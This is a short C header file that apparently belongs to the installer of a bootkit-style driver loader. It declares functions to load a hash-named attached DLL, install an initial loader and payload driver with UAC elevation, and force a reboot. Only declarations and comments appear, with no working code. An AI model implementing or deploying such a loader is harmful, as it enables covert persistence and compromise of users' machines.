//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.9
//	
// module: bkinst.h
// $Revision: 424 $
// $Date: 2014-11-28 17:59:11 +0300 (Пт, 28 ноя 2014) $
// description: 
//	BK installation library

extern ULONG	g_CurrentProcessId;
extern HMODULE	g_CurrentModule;


//
//	Creates a section and loads the specified attached DLL into it.
//	Initializes DLL image and executes it's DllMain.
//
WINERROR BkLoadSupportDll(
	ULONG	NameHash	// Attached DLL name hash
	);

//
//	Installs the BK initial loader and a payload driver depending on current architecture.
//
WINERROR	BkSetup(
	BOOL	bWaitUac		// specify TRUE to enable UAC elevation before the setup. 
	);


//
//	Enables SeShutdownPrivilege for the current process and attempts to reboot the system.
//
VOID BkReboot(VOID);